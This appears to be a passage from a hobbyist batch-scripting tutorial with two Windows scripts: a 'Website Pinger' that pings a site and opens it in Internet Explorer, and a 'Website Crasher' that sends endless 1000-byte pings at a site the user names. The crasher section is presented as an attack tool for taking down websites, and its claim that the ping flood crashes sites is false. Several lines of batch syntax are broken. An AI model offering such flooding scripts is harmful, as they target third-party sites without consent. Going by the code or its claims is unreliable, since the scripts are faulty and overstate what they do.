:A
@echo off
Title Website Pinger
color 0e
echo Enter the website you would like to ping
set input=
set /p input= Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo -------------------------------------------------------------------------------------
echo If you do not clost this in 45 seconds you will go to **ENTER WEBSITE HERE**
echo -------------------------------------------------------------------------------------
ping localhost>nul
echo This is the IP=
ping %input%
set input=
set /p input= If you want to open this adress please enter the IP here:
start iexplore.exe %input%
set input2=
set /p input2=
if %input% exit goto exit
ping localhost -n 45 >nul
start iexplore.exe **ENTER WEBSITE HERE**
exit
:exit
exit


Where it says "**ENTER WEBSITE HERE** put your website...if you dont have one delete both lines


Step 3: Website Crasher
 
This site is just like the Website pinger but insted of pinging it crashes it with 1000 data non stop

':A
@echo off
Title Website Crasher
color 0e
echo Enter the website you would like to crash
set input=
set /p input= Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Now Crashing Website...DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
echo ----------------------------------------------------------------------
ping %input% -t -l 1000


